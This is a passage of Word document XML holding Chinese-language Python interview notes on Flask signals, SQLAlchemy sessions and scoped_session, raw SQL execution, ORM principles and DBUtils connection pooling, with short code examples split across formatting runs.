    <w:p w14:paraId="02E322D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request_tearing_down = _signals.signal('request-tearing-down')#</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>请求执行完毕后自动执行（无论成功与否）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EBB325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appcontext_tearing_down = _signals.signal('appcontext-tearing-down')# </w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>请求上下文执行完毕后自动执行（无论成功与否）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E8831D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appcontext_pushed = _signals.signal('appcontext-pushed') #</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>请求</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>app</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>上下文</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>push</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>时执行</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59EBFE7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appcontext_popped = _signals.signal('appcontext-popped') #</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>请求上下文</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>pop</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>时执行</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D5132C2" w14:textId="6BA139A2"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message_flashed = _signals.signal('message-flashed')#</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>调用</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>flask</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>在其中添加数据时，自动触发</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AB767A4" w14:textId="5CE23327"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076</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SQLAlchemy</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>中的</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t xml:space="preserve"> session</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t xml:space="preserve">scoped_session </w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>的区别？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="090FD05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Session</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EB7E08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由于无法提供线程共享功能，开发时要给每个线程都创建自己的</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>session</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F2CCBB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打印</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>sesion</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>可知他是</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>sqlalchemy.orm.session.Session</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的对象</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="648F37C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scoped_session</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="655C2F3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为每个线程都创建一个</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>session</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，实现支持线程安全</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C8BAA2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在整个程序运行的过程当中，只存在唯一的一个</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>session</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>对象。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="350C0A0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创建方式</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29E8FF7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通过本地线程</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Threading.Local()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A9E358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session=scoped_session(Session)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D83B1AB" w14:textId="105B506D"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创建唯一标识的方法</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参考</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>flask</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>请求源码</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10439FB3" w14:textId="47AB5BC6"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077</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SQLAlchemy</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>如何执行原生</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D5260C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使用</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>execute</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>方法直接操作</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>语句</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导入</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>create_engin</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sessionmaker)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C58A35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engine=create_engine('mysql://root:*****@127.0.0.1/database?charset=utf8')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F7E242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DB_Session = sessionmaker(bind=engine)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="053DE22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session = DB_Session()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B6E0555" w14:textId="341E71CF"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session.execute('alter table mytablename drop column mycolumn ;')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56CF75E1" w14:textId="68650B85"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078</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ORM</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>的实现原理？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FEA171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ORM</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的实现基于一下三点</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="028401A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映射类：描述数据库表结构，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D4138A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映射文件：指定数据库表和映射类之间的关系</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12A66A74" w14:textId="32326462"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数据库配置文件：指定与数据库连接时需要的连接信息</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数据库、登录用户名、密码</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>or</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>连接字符串</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EDC9AFE" w14:textId="77AE5422"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079</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DBUtils</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>模块的作用？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5032F5F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数据库连接池</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E12C99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使用模式：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41CC7CE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1</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>、为每个线程创建一个连接，连接不可控，需要控制线程数</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CE1461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2</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>、创建指定数量的连接在连接池，当线程访问的时候去取，不够了线程排队，直到有人释放</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>推荐</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="494BEBA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p>
    <w:p w14:paraId="009D329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两种写法：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29AA0C5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1</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>、用静态方法装饰器，通过直接执行类的方法来连接使用数据库</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BA9394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2</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>、通过实例化对象，通过对象来调用方法执行语句</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6813FB00" w14:textId="0B1358E0"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https://www.cnblogs.com/ArmoredTitan/p/Flask.html</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61911D1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以下</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>SQLAlchemy</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的字段是否正确？如果不正确请更正：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17150ED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fromdatetime importdatetime</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DE7E72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MS Gothic" w:eastAsia="MS Gothic" w:hAnsi="MS Gothic" w:cs="MS Gothic" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>fromsqlalchemy.ext.declarative</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="649BF68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importdeclarative_base</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E4E2CD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MS Gothic" w:eastAsia="MS Gothic" w:hAnsi="MS Gothic" w:cs="MS Gothic" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>fromsqlalchemy importColumn, Integer, String, DateTime</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="281B98C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MS Gothic" w:eastAsia="MS Gothic" w:hAnsi="MS Gothic" w:cs="MS Gothic" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45C13EF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Base =declarative_base()</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="MS Gothic" w:eastAsia="MS Gothic" w:hAnsi="MS Gothic" w:cs="MS Gothic" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2198A14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classUserInfo(Base):</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="MS Gothic" w:eastAsia="MS Gothic" w:hAnsi="MS Gothic" w:cs="MS Gothic" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>   </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7770190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__tablename__ ='userinfo'</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="MS Gothic" w:eastAsia="MS Gothic" w:hAnsi="MS Gothic" w:cs="MS Gothic" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>   </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="227DF60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id=Column(Integer, primary_key=True, autoincrement=True)</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="MS Gothic" w:eastAsia="MS Gothic" w:hAnsi="MS Gothic" w:cs="MS Gothic" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5553DFA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name =Column(String(64), unique=True)</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="MS Gothic" w:eastAsia="MS Gothic" w:hAnsi="MS Gothic" w:cs="MS Gothic" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A6010FE" w14:textId="00AB0599"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ctime =Column(DateTime, default=datetime.now())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5278E0C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datetime import datetime</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0253F98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sqlalchemy.ext.declarative</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A99661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import declarative_base</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19EE98B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from sqlalchemy import Column, Integer, String, DateTime</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71646CF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34B5B93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Base = declarative_base()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A90544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class UserInfo(Base):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DFD9F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lastRenderedPageBreak/>
